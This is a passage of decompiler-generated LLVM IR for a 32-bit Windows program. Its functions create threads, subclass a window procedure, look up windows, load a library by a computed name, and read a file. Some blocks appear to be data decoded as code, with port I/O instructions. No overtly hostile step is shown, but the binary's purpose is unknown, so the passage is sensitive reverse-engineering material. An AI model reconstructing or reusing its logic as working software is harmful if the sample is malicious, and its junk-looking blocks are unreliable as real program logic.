  %3 = inttoptr i32 %0 to i8*, !insn.addr !1480
  store i8 %2, i8* %3, align 1, !insn.addr !1480
  ret i32 %0, !insn.addr !1480
}

define i32 @function_40666c() local_unnamed_addr {
dec_label_pc_40666c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i1 @__decompiler_undefined_function_1()
  %4 = call i1 @__decompiler_undefined_function_1()
  br i1 %3, label %dec_label_pc_4066d0, label %dec_label_pc_40666f, !insn.addr !1481

dec_label_pc_40666f:                              ; preds = %dec_label_pc_40666c
  %5 = icmp eq i1 %4, false, !insn.addr !1482
  br i1 %5, label %dec_label_pc_4066e4, label %dec_label_pc_406671, !insn.addr !1482

dec_label_pc_406671:                              ; preds = %dec_label_pc_40666f
  ret i32 %2, !insn.addr !1483

dec_label_pc_4066d0:                              ; preds = %dec_label_pc_40666c
  %6 = call i32 @function_4045ac(), !insn.addr !1484
  br label %dec_label_pc_4066e4, !insn.addr !1485

dec_label_pc_4066e4:                              ; preds = %dec_label_pc_4066d0, %dec_label_pc_40666f
  %7 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* null, i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1486
  %8 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1487
  %9 = add i32 %0, 20, !insn.addr !1488
  %10 = inttoptr i32 %9 to i32*, !insn.addr !1488
  %11 = load i32, i32* %10, align 4, !insn.addr !1488
  %12 = add i32 %0, 16, !insn.addr !1489
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1489
  %14 = load i32, i32* %13, align 4, !insn.addr !1489
  %15 = add i32 %0, 8, !insn.addr !1490
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1490
  %17 = load i32, i32* %16, align 4, !insn.addr !1490
  %18 = inttoptr i32 %11 to i32*, !insn.addr !1491
  %19 = call i32 @DefWindowProcA(i32* %18, i32 %14, i32 %1, i32 %17), !insn.addr !1491
  ret i32 %19, !insn.addr !1492
}

define i32 @function_40671c() local_unnamed_addr {
dec_label_pc_40671c:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = ptrtoint i32 (i32, i32, i32)* %0 to i32
  %2 = call i32* @CreateWindowExA(i32 0, i8* null, i8* null, i32 0, i32 0, i32 0, i32 0, i32 %1, i32* null, i32* nonnull @0, i32* nonnull @0, i32* nonnull @0), !insn.addr !1493
  %3 = ptrtoint i32* %2 to i32, !insn.addr !1493
  %4 = call i32 @SetWindowLongA(i32* inttoptr (i32 4220576 to i32*), i32 -4, i32 %3), !insn.addr !1494
  ret i32 %4, !insn.addr !1495
}

define i32 @function_406751(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_406751:
  %merge7.reg2mem = alloca i32, !insn.addr !1496
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = trunc i32 %1 to i8
  %3 = mul i8 %2, 2, !insn.addr !1496
  %4 = inttoptr i32 %1 to i8*, !insn.addr !1496
  store i8 %3, i8* %4, align 1, !insn.addr !1496
  %5 = add i32 %1, 114, !insn.addr !1497
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1497
  %7 = load i8, i8* %6, align 1, !insn.addr !1497
  %8 = udiv i32 %0, 256, !insn.addr !1497
  %9 = trunc i32 %8 to i8, !insn.addr !1497
  %10 = add i8 %7, %9, !insn.addr !1497
  store i8 %10, i8* %6, align 1, !insn.addr !1497
  %11 = add i8 %2, -32, !insn.addr !1498
  %12 = icmp ult i8 %2, 32, !insn.addr !1498
  %13 = icmp eq i8 %11, 0, !insn.addr !1498
  %14 = zext i8 %11 to i32, !insn.addr !1498
  %15 = and i32 %1, -256, !insn.addr !1498
  %16 = or i32 %15, %14, !insn.addr !1498
  %17 = or i1 %12, %13, !insn.addr !1499
  store i32 %16, i32* %merge7.reg2mem, !insn.addr !1499
  br i1 %17, label %dec_label_pc_40675a, label %dec_label_pc_4067ab, !insn.addr !1499

dec_label_pc_40675a:                              ; preds = %dec_label_pc_406751
  %18 = add i32 %16, 105, !insn.addr !1500
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1500
  %20 = load i8, i8* %19, align 1, !insn.addr !1500
  %21 = and i8 %20, %9, !insn.addr !1500
  store i8 %21, i8* %19, align 1, !insn.addr !1500
  %22 = trunc i32 %arg3 to i16, !insn.addr !1501
  %23 = inttoptr i32 %arg6 to i8*, !insn.addr !1501
  %24 = load i8, i8* %23, align 1, !insn.addr !1501
  call void @__asm_outsb(i16 %22, i8 %24), !insn.addr !1501
  %25 = add i32 %arg5, 105, !insn.addr !1502
  %26 = and i32 %25, 65535
  %27 = inttoptr i32 %26 to i8*, !insn.addr !1502
  %28 = load i8, i8* %27, align 1, !insn.addr !1502
  %29 = udiv i32 %arg2, 256, !insn.addr !1502
  %30 = trunc i32 %29 to i8, !insn.addr !1502
  %31 = and i8 %28, %30, !insn.addr !1502
  store i8 %31, i8* %27, align 1, !insn.addr !1502
  %32 = mul i32 %arg5, 2, !insn.addr !1503
  %33 = add i32 %arg2, 115, !insn.addr !1503
  %34 = add i32 %33, %32, !insn.addr !1503
  %35 = inttoptr i32 %34 to i8*, !insn.addr !1503
  %36 = load i8, i8* %35, align 1, !insn.addr !1503
  %37 = trunc i32 %arg2 to i8, !insn.addr !1503
  %38 = add i8 %36, %37, !insn.addr !1503
  %39 = icmp eq i8 %38, 0, !insn.addr !1503
  store i8 %38, i8* %35, align 1, !insn.addr !1503
  store i32 %arg1, i32* %merge7.reg2mem, !insn.addr !1504
  br i1 %39, label %dec_label_pc_4067ab, label %dec_label_pc_406769, !insn.addr !1504

dec_label_pc_406769:                              ; preds = %dec_label_pc_40675a
  %40 = inttoptr i32 %arg6 to i32*, !insn.addr !1505
  %41 = load i32, i32* %40, align 4, !insn.addr !1505
  call void @__asm_outsd(i16 %22, i32 %41), !insn.addr !1505
  %42 = inttoptr i32 %arg5 to i8*, !insn.addr !1506
  %43 = call i32* @FindWindowA(i8* %42, i8* bitcast (i32* @0 to i8*)), !insn.addr !1506
  %44 = ptrtoint i32* %43 to i32, !insn.addr !1506
  %45 = icmp eq i32* %43, null, !insn.addr !1507
  %46 = icmp eq i1 %45, false, !insn.addr !1508
  store i32 %44, i32* %merge7.reg2mem, !insn.addr !1508
  br i1 %46, label %dec_label_pc_4067ab, label %dec_label_pc_40678d, !insn.addr !1508

dec_label_pc_40678d:                              ; preds = %dec_label_pc_406769
  %47 = call i32 @function_40671c(), !insn.addr !1509
  %48 = call i32 @function_4036c8(), !insn.addr !1510
  %49 = inttoptr i32 %48 to i8*, !insn.addr !1511
  %50 = call i32* @LoadLibraryA(i8* %49), !insn.addr !1512
  %51 = ptrtoint i32* %50 to i32, !insn.addr !1512
  ret i32 %51, !insn.addr !1513

dec_label_pc_4067ab:                              ; preds = %dec_label_pc_406751, %dec_label_pc_406769, %dec_label_pc_40675a
  %merge7.reload = load i32, i32* %merge7.reg2mem
  ret i32 %merge7.reload, !insn.addr !1514
}

define i32 @function_406871(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_406871:
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !1515
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_32 = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_16 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_16, align 4
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1515
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1515
  %9 = add i8 %6, %8, !insn.addr !1515
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1515
  store i8 %9, i8* %10, align 1, !insn.addr !1515
  %11 = load i32, i32* %eax, align 4, !insn.addr !1516
  %12 = add i32 %11, 114, !insn.addr !1516
  %13 = inttoptr i32 %12 to i8*, !insn.addr !1516
  %14 = load i8, i8* %13, align 1, !insn.addr !1516
  %15 = udiv i32 %2, 256, !insn.addr !1516
  %16 = trunc i32 %15 to i8, !insn.addr !1516
  %17 = add i8 %14, %16, !insn.addr !1516
  store i8 %17, i8* %13, align 1, !insn.addr !1516
  %18 = load i32, i32* %eax, align 4
  %19 = trunc i32 %18 to i8, !insn.addr !1517
  %20 = add i8 %19, -32, !insn.addr !1517
  %21 = icmp ult i8 %19, 32, !insn.addr !1517
  %22 = icmp eq i8 %20, 0, !insn.addr !1517
  %23 = zext i8 %20 to i32, !insn.addr !1517
  %24 = and i32 %18, -256, !insn.addr !1517
  %25 = or i32 %24, %23, !insn.addr !1517
  store i32 %25, i32* %eax, align 4, !insn.addr !1517
  %26 = or i1 %21, %22, !insn.addr !1518
  br i1 %26, label %dec_label_pc_40687a, label %dec_label_pc_4068e9, !insn.addr !1518

dec_label_pc_40687a:                              ; preds = %dec_label_pc_406871
  %27 = add i32 %25, 105, !insn.addr !1519
  %28 = inttoptr i32 %27 to i8*, !insn.addr !1519
  %29 = load i8, i8* %28, align 1, !insn.addr !1519
  %30 = and i8 %29, %16, !insn.addr !1519
  store i8 %30, i8* %28, align 1, !insn.addr !1519
  %31 = load i32, i32* %stack_var_28, align 4, !insn.addr !1520
  store i32 %31, i32* %eax, align 4, !insn.addr !1520
  %32 = trunc i32 %arg3 to i16, !insn.addr !1521
  %33 = inttoptr i32 %arg6 to i8*, !insn.addr !1521
  %34 = load i8, i8* %33, align 1, !insn.addr !1521
  call void @__asm_outsb(i16 %32, i8 %34), !insn.addr !1521
  %35 = add i32 %arg5, 105, !insn.addr !1522
  %36 = and i32 %35, 65535
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1522
  %38 = load i8, i8* %37, align 1, !insn.addr !1522
  %39 = udiv i32 %arg2, 256, !insn.addr !1522
  %40 = trunc i32 %39 to i8, !insn.addr !1522
  %41 = and i8 %38, %40, !insn.addr !1522
  store i8 %41, i8* %37, align 1, !insn.addr !1522
  %42 = mul i32 %arg5, 2, !insn.addr !1523
  %43 = add i32 %arg2, 115, !insn.addr !1523
  %44 = add i32 %43, %42, !insn.addr !1523
  %45 = inttoptr i32 %44 to i8*, !insn.addr !1523
  %46 = load i8, i8* %45, align 1, !insn.addr !1523
  %47 = trunc i32 %arg2 to i8, !insn.addr !1523
  %48 = add i8 %46, %47, !insn.addr !1523
  %49 = icmp eq i8 %48, 0, !insn.addr !1523
  store i8 %48, i8* %45, align 1, !insn.addr !1523
  store i32* %stack_var_32, i32** %esp.0.in.reg2mem, !insn.addr !1524
  br i1 %49, label %dec_label_pc_4068cb, label %dec_label_pc_406889, !insn.addr !1524

dec_label_pc_406889:                              ; preds = %dec_label_pc_40687a
  %50 = icmp slt i8 %48, 0, !insn.addr !1523
  %51 = inttoptr i32 %arg6 to i32*, !insn.addr !1525
  %52 = load i32, i32* %51, align 4, !insn.addr !1525
  call void @__asm_outsd(i16 %32, i32 %52), !insn.addr !1525
  br i1 %50, label %dec_label_pc_406900, label %dec_label_pc_40688e, !insn.addr !1526

dec_label_pc_40688e:                              ; preds = %dec_label_pc_406889
  %53 = load i32, i32* %eax, align 4
  %54 = trunc i32 %53 to i8, !insn.addr !1527
  %55 = add i8 %54, -32, !insn.addr !1527
  %56 = icmp ult i8 %54, 32, !insn.addr !1527
  %57 = icmp eq i8 %55, 0, !insn.addr !1527
  %58 = zext i8 %55 to i32, !insn.addr !1527
  %59 = and i32 %53, -256, !insn.addr !1527
  %60 = or i32 %59, %58, !insn.addr !1527
  store i32 %60, i32* %eax, align 4, !insn.addr !1527
  %61 = or i1 %56, %57, !insn.addr !1528
  br i1 %61, label %dec_label_pc_406892, label %dec_label_pc_406901, !insn.addr !1528

dec_label_pc_406892:                              ; preds = %dec_label_pc_40688e
  %62 = add i32 %arg2, 105, !insn.addr !1529
  %63 = inttoptr i32 %62 to i8*, !insn.addr !1529
  %64 = load i8, i8* %63, align 1, !insn.addr !1529
  %65 = udiv i32 %53, 256, !insn.addr !1529
  %66 = trunc i32 %65 to i8, !insn.addr !1529
  %67 = and i8 %64, %66, !insn.addr !1529
  store i8 %67, i8* %63, align 1, !insn.addr !1529
  %68 = add i32 %arg6, 105, !insn.addr !1530
  %69 = inttoptr i32 %68 to i8*, !insn.addr !1530
  %70 = load i8, i8* %69, align 1, !insn.addr !1530
  %71 = and i8 %70, %40, !insn.addr !1530
  store i8 %71, i8* %69, align 1, !insn.addr !1530
  %72 = load i32, i32* %eax, align 4
  %73 = inttoptr i32 %72 to i8*, !insn.addr !1531
  %74 = load i8, i8* %73, align 1, !insn.addr !1531
  %75 = trunc i32 %72 to i8, !insn.addr !1531
  %76 = add i8 %74, %75, !insn.addr !1531
  store i8 %76, i8* %73, align 1, !insn.addr !1531
  %77 = load i32, i32* %eax, align 4
  %78 = inttoptr i32 %77 to i8*, !insn.addr !1532
  %79 = load i8, i8* %78, align 1, !insn.addr !1532
  %80 = trunc i32 %77 to i8, !insn.addr !1532
  %81 = add i8 %79, %80, !insn.addr !1532
  store i8 %81, i8* %78, align 1, !insn.addr !1532
  %82 = inttoptr i32 %arg2 to i32*, !insn.addr !1533
  %83 = load i32, i32* %82, align 4, !insn.addr !1533
  %84 = add i32 %83, %arg6, !insn.addr !1533
  store i32 %84, i32* %82, align 4, !insn.addr !1533
  %85 = load i32, i32* %eax, align 4
  %86 = inttoptr i32 %85 to i8*, !insn.addr !1534
  %87 = load i8, i8* %86, align 1, !insn.addr !1534
  %88 = trunc i32 %85 to i8, !insn.addr !1534
  %89 = add i8 %87, %88, !insn.addr !1534
  store i8 %89, i8* %86, align 1, !insn.addr !1534
  store i32 %arg5, i32* %stack_var_28, align 4, !insn.addr !1535
  %90 = call i32 @__readfsdword(i32 0), !insn.addr !1536
  store i32 %90, i32* %stack_var_16, align 4, !insn.addr !1536
  %91 = ptrtoint i32* %stack_var_16 to i32, !insn.addr !1536
  call void @__writefsdword(i32 0, i32 %91), !insn.addr !1537
  %92 = load i32, i32* @global_var_4096d4, align 4, !insn.addr !1538
  %93 = add i32 %92, 1, !insn.addr !1538
  %94 = icmp eq i32 %93, 0, !insn.addr !1538
  store i32 %93, i32* @global_var_4096d4, align 4, !insn.addr !1538
  %95 = icmp eq i1 %94, false, !insn.addr !1539
  br i1 %95, label %dec_label_pc_4068c3, label %dec_label_pc_4068b9, !insn.addr !1539

dec_label_pc_4068b9:                              ; preds = %dec_label_pc_406892
  %96 = call i32 @"@LStrClr"(), !insn.addr !1540
  br label %dec_label_pc_4068c3, !insn.addr !1540

dec_label_pc_4068c3:                              ; preds = %dec_label_pc_4068b9, %dec_label_pc_406892
  store i32 0, i32* %eax, align 4, !insn.addr !1541
  %97 = load i32, i32* %stack_var_16, align 4, !insn.addr !1542
  call void @__writefsdword(i32 0, i32 %97), !insn.addr !1543
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !1543
  br label %dec_label_pc_4068cb, !insn.addr !1543

dec_label_pc_4068cb:                              ; preds = %dec_label_pc_4068c3, %dec_label_pc_40687a
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %98 = add i32 %esp.0, -4, !insn.addr !1544
  %99 = inttoptr i32 %98 to i32*, !insn.addr !1544
  store i32 4221144, i32* %99, align 4, !insn.addr !1544
  %100 = load i32, i32* %eax, align 4, !insn.addr !1545
  ret i32 %100, !insn.addr !1545

dec_label_pc_4068e9:                              ; preds = %dec_label_pc_406871
  %101 = mul i32 %4, 2, !insn.addr !1546
  %102 = add i32 %1, 105, !insn.addr !1546
  %103 = add i32 %102, %101, !insn.addr !1546
  %104 = inttoptr i32 %103 to i32*, !insn.addr !1546
  %105 = load i32, i32* %104, align 4, !insn.addr !1546
  %106 = or i32 %105, %3, !insn.addr !1546
  store i32 %106, i32* %104, align 4, !insn.addr !1546
  %107 = add i32 %0, -1, !insn.addr !1547
  %108 = trunc i32 %3 to i16, !insn.addr !1548
  %109 = inttoptr i32 %107 to i32*, !insn.addr !1548
  %110 = load i32, i32* %109, align 4, !insn.addr !1548
  call void @__asm_outsd(i16 %108, i32 %110), !insn.addr !1548
  %111 = load i32, i32* %eax, align 4, !insn.addr !1549
  %112 = call i8 @__readgsbyte(i32 %111), !insn.addr !1549
  %113 = load i32, i32* %eax, align 4
  %114 = trunc i32 %113 to i8, !insn.addr !1549
  %115 = or i8 %112, %114, !insn.addr !1549
  call void @__writegsbyte(i32 %113, i8 %115), !insn.addr !1549
  %116 = load i32, i32* %eax, align 4
  %117 = inttoptr i32 %116 to i8*, !insn.addr !1550
  %118 = load i8, i8* %117, align 1, !insn.addr !1550
  %119 = trunc i32 %116 to i8, !insn.addr !1550
  %120 = add i8 %118, %119, !insn.addr !1550
  store i8 %120, i8* %117, align 1, !insn.addr !1550
  %121 = load i32, i32* %eax, align 4
  %122 = trunc i32 %121 to i8, !insn.addr !1551
  %123 = inttoptr i32 %121 to i8*, !insn.addr !1551
  %124 = load i8, i8* %123, align 1, !insn.addr !1551
  %125 = add i8 %124, %122, !insn.addr !1551
  %126 = zext i8 %125 to i32, !insn.addr !1551
  %127 = and i32 %121, -256, !insn.addr !1551
  %128 = or i32 %127, %126, !insn.addr !1551
  %129 = inttoptr i32 %128 to i8*, !insn.addr !1552
  %130 = load i8, i8* %129, align 1, !insn.addr !1552
  %131 = trunc i32 %3 to i8, !insn.addr !1553
  %132 = add i8 %125, %131, !insn.addr !1552
  %133 = add i8 %132, %130, !insn.addr !1553
  store i8 %133, i8* %129, align 1, !insn.addr !1553
  %134 = add i32 %128, 1, !insn.addr !1554
  store i32 %134, i32* %eax, align 4, !insn.addr !1554
  %135 = inttoptr i32 %134 to i8*, !insn.addr !1555
  %136 = load i8, i8* %135, align 1, !insn.addr !1555
  %137 = trunc i32 %134 to i8, !insn.addr !1555
  %138 = add i8 %136, %137, !insn.addr !1555
  store i8 %138, i8* %135, align 1, !insn.addr !1555
  br label %dec_label_pc_406900, !insn.addr !1555

dec_label_pc_406900:                              ; preds = %dec_label_pc_4068e9, %dec_label_pc_406889
  %139 = load i32, i32* %eax, align 4, !insn.addr !1555
  ret i32 %139, !insn.addr !1555

dec_label_pc_406901:                              ; preds = %dec_label_pc_40688e
  %140 = inttoptr i32 %60 to i8*, !insn.addr !1556
  %141 = load i8, i8* %140, align 1, !insn.addr !1556
  %142 = add i8 %141, %55, !insn.addr !1556
  store i8 %142, i8* %140, align 1, !insn.addr !1556
  %143 = load i32, i32* %eax, align 4
  %144 = inttoptr i32 %143 to i8*, !insn.addr !1557
  %145 = load i8, i8* %144, align 1, !insn.addr !1557
  %146 = trunc i32 %arg3 to i8, !insn.addr !1557
  %147 = add i8 %145, %146, !insn.addr !1557
  store i8 %147, i8* %144, align 1, !insn.addr !1557
  %148 = load i32, i32* %eax, align 4, !insn.addr !1558
  %149 = add i32 %148, 1, !insn.addr !1558
  %150 = mul i32 %149, 2, !insn.addr !1559
  %151 = inttoptr i32 %150 to i8*, !insn.addr !1559
  %152 = load i8, i8* %151, align 2, !insn.addr !1559
  %153 = trunc i32 %149 to i8, !insn.addr !1559
  %154 = add i8 %152, %153, !insn.addr !1559
  store i8 %154, i8* %151, align 2, !insn.addr !1559
  %155 = inttoptr i32 %149 to i8*, !insn.addr !1560
  %156 = load i8, i8* %155, align 1, !insn.addr !1560
  %157 = add i8 %156, %153, !insn.addr !1560
  store i8 %157, i8* %155, align 1, !insn.addr !1560
  ret i32 %149, !insn.addr !1561
}

define i32 @function_40691f() local_unnamed_addr {
dec_label_pc_40691f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1562
}

define i32 @function_40692c() local_unnamed_addr {
dec_label_pc_40692c:
  %esp.1.reg2mem = alloca i32, !insn.addr !1563
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-84 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1564
  store i32 %0, i32* %stack_var_-56, align 4, !insn.addr !1564
  %1 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1564
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1565
  %2 = call i32 @"@LStrCat3"(), !insn.addr !1566
  %3 = call i32 @function_4036c8(), !insn.addr !1567
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1568
  store i8* %4, i8** %stack_var_-84, align 4, !insn.addr !1568
  %5 = ptrtoint i8** %stack_var_-84 to i32, !insn.addr !1568
  %6 = call i32* @CreateFileA(i8* %4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1569
  %7 = icmp eq i32* %6, inttoptr (i32 -1 to i32*), !insn.addr !1570
  store i32 %5, i32* %esp.1.reg2mem, !insn.addr !1571
  br i1 %7, label %dec_label_pc_406acb, label %dec_label_pc_406996, !insn.addr !1571

dec_label_pc_406996:                              ; preds = %dec_label_pc_40692c
  %8 = ptrtoint i32* %6 to i32, !insn.addr !1569
  store i32 %8, i32* %stack_var_-92, align 4, !insn.addr !1572
  %9 = ptrtoint i32* %stack_var_-92 to i32, !insn.addr !1572
  %10 = call i32 @GetFileSize(i32* null, i32* %6), !insn.addr !1573
  %11 = add i32 %10, 1
  %12 = icmp ult i32 %11, 2
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !1574
  br i1 %12, label %dec_label_pc_406acb, label %dec_label_pc_4069b2, !insn.addr !1574

dec_label_pc_4069b2:                              ; preds = %dec_label_pc_406996
  %13 = call i32 @"@LStrSetLength"(), !insn.addr !1575
  %14 = call i32 @function_403720(), !insn.addr !1576
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1577
  %16 = call i1 @ReadFile(i32* %15, i32* %6, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0, %_OVERLAPPED* bitcast (i32* @0 to %_OVERLAPPED*)), !insn.addr !1577
  store i32 %8, i32* %stack_var_-116, align 4, !insn.addr !1578
  %17 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !1578
  %18 = call i1 @CloseHandle(i32* %6), !insn.addr !1579
  %19 = call i32 @function_4046d4(), !insn.addr !1580
  store i32 %17, i32* %esp.1.reg2mem
  br label %dec_label_pc_406acb

dec_label_pc_406acb:                              ; preds = %dec_label_pc_4069b2, %dec_label_pc_406996, %dec_label_pc_40692c
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %20 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !1581
  %21 = load i32, i32* %20, align 4, !insn.addr !1581
  call void @__writefsdword(i32 0, i32 %21), !insn.addr !1582
  %22 = add i32 %esp.1.reload, 8, !insn.addr !1583
  %23 = inttoptr i32 %22 to i32*, !insn.addr !1583
  store i32 4221677, i32* %23, align 4, !insn.addr !1583
  %24 = call i32 @"@LStrArrayClr"(), !insn.addr !1584
  ret i32 %24, !insn.addr !1585
}

define i32 @function_406ae6() local_unnamed_addr {
dec_label_pc_406ae6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1586
  ret i32 %0, !insn.addr !1586
}

define i32 @function_406aeb() local_unnamed_addr {
dec_label_pc_406aeb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1587
}

define i32 @function_406aed(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406aed:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1588
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1588
  %3 = load i32, i32* %2, align 4, !insn.addr !1588
  ret i32 %3, !insn.addr !1589
}

define i32 @function_406b24() local_unnamed_addr {
dec_label_pc_406b24:
  %esp.2.reg2mem = alloca i32, !insn.addr !1590
  %esp.1.reg2mem = alloca i32, !insn.addr !1590
  %esi.0.reg2mem = alloca i32, !insn.addr !1590
  %esp.0.reg2mem = alloca i32, !insn.addr !1590
  %ebx.0.reg2mem = alloca i32, !insn.addr !1590
  %stack_var_-68 = alloca i8*, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1591
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1592
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1592
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1592
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1593
  %2 = call i32 @function_403c88(), !insn.addr !1594
  %3 = icmp slt i32 %2, 1
  store i32 %1, i32* %esp.2.reg2mem, !insn.addr !1595
  br i1 %3, label %dec_label_pc_406c0d, label %dec_label_pc_406b52, !insn.addr !1595

dec_label_pc_406b52:                              ; preds = %dec_label_pc_406b24
  %4 = call i32 @"@LStrCat3"(), !insn.addr !1596
  %5 = call i32 @function_4036c8(), !insn.addr !1597
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1598
  store i8* %6, i8** %stack_var_-68, align 4, !insn.addr !1598
  %7 = ptrtoint i8** %stack_var_-68 to i32, !insn.addr !1598
  %8 = call i32* @CreateFileA(i8* %6, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1599
  %9 = icmp eq i32* %8, inttoptr (i32 -1 to i32*), !insn.addr !1600
  store i32 %7, i32* %esp.2.reg2mem, !insn.addr !1601
  br i1 %9, label %dec_label_pc_406c0d, label %dec_label_pc_406b8e, !insn.addr !1601

dec_label_pc_406b8e:                              ; preds = %dec_label_pc_406b52
  %10 = call i32 @"@LStrClr"(), !insn.addr !1602
  %11 = call i32 @function_403c90(), !insn.addr !1603
  %12 = icmp slt i32 %11, 0, !insn.addr !1604
  store i32 %7, i32* %esp.1.reg2mem, !insn.addr !1605
  br i1 %12, label %dec_label_pc_406bd8, label %dec_label_pc_406ba6, !insn.addr !1605

dec_label_pc_406ba6:                              ; preds = %dec_label_pc_406b8e
  %13 = add i32 %11, 1, !insn.addr !1606
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !1607
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !1607
  store i32 %13, i32* %esi.0.reg2mem, !insn.addr !1607
  br label %dec_label_pc_406ba9, !insn.addr !1607

dec_label_pc_406ba9:                              ; preds = %dec_label_pc_406ba9, %dec_label_pc_406ba6
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %14 = add i32 %esp.0.reload, -4, !insn.addr !1608
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1608
  store i32 0, i32* %15, align 4, !insn.addr !1608
  %16 = load i32, i32* @global_var_4096dc, align 4, !insn.addr !1609
  %17 = mul i32 %ebx.0.reload, 8, !insn.addr !1610
  %18 = add i32 %16, %17, !insn.addr !1610
  %19 = inttoptr i32 %18 to i32*, !insn.addr !1610
  %20 = load i32, i32* %19, align 4, !insn.addr !1610
  %21 = add i32 %esp.0.reload, -8, !insn.addr !1610
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1610
  store i32 %20, i32* %22, align 4, !insn.addr !1610
  %23 = add i32 %esp.0.reload, -12, !insn.addr !1611
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1611
  store i32 ptrtoint (i32* @global_var_406c54 to i32), i32* %24, align 4, !insn.addr !1611
  %25 = load i32, i32* @global_var_4096dc, align 4, !insn.addr !1612
  %26 = or i32 %17, 4, !insn.addr !1613
  %27 = add i32 %25, %26, !insn.addr !1613
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1613
  %29 = load i32, i32* %28, align 4, !insn.addr !1613
  %30 = add i32 %esp.0.reload, -16, !insn.addr !1613
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1613
  store i32 %29, i32* %31, align 4, !insn.addr !1613
  %32 = add i32 %esp.0.reload, -20, !insn.addr !1614
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1614
  store i32 ptrtoint ([3 x i8]* @global_var_406c60 to i32), i32* %33, align 4, !insn.addr !1614
  %34 = call i32 @"@LStrCatN"(), !insn.addr !1615
  %35 = add i32 %ebx.0.reload, 1, !insn.addr !1616
  %36 = add i32 %esi.0.reload, -1, !insn.addr !1617
  %37 = icmp eq i32 %36, 0, !insn.addr !1617
  %38 = icmp eq i1 %37, false, !insn.addr !1618
